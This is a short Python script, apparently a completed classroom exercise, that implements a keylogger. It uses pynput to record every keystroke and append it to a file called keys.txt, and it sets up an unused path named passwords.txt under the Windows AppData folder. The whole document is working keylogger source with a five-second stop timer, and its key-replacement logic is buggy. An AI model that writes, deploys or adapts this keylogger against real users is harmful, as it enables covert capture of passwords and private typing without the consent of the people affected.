
import os
from pynput.keyboard import Listener
from threading import Timer
keys = []
count = 0
file_to_write = os.environ['appdata'] + '\\passwords.txt'    # for running on Windows
#file_to_write = 'passwords.txt'      # for running on Linux and Mac

print("keylogger started.")
def on_press(key):
    global keys, count
    #print(key)
    ## append key to keys
    ## increment count by 1
    ## if count >=1, reset count, call the write_file function, pass keys as parameter
    ## reset keys
    ## ----------
    ## Your code goes here
    keys.append(key)
    count = count + 1
    if (count >= 1 ):
        count = 0
        write_file(keys)
        keys = []
    ## -----------
def write_file(keys):
    ## open file_to_write in append mode
    f = open("keys.txt", "a")
    for key in keys:
        k = str(key).replace("'", " ")
        ## replace backspace with 'Backspace'
        ## replace enter with "\n"
        ## relace shift with "Shift"
        ## replace space with ' '
        ## replace caps_lock with 'Caps Lock'
        ## ----------
        ## Your code goes here
        k = str(key).replace("Key.backspace", "Backspace")
        k = str(key).replace("Key.enter", "\n")
        k = str(key).replace("Key.shift", "Shift")
        k = str(key).replace("Key.space", " ")
        k = str(key).replace("Key.caps_lock", "Caps Lock")
        ## -----------
        #elif k.find('key'):
        f.write(k)
        f.write('\n')
with Listener(on_press=on_press) as listener:
    Timer(5, listener.stop).start()
    listener.join()

print("keylogger shutdown.")
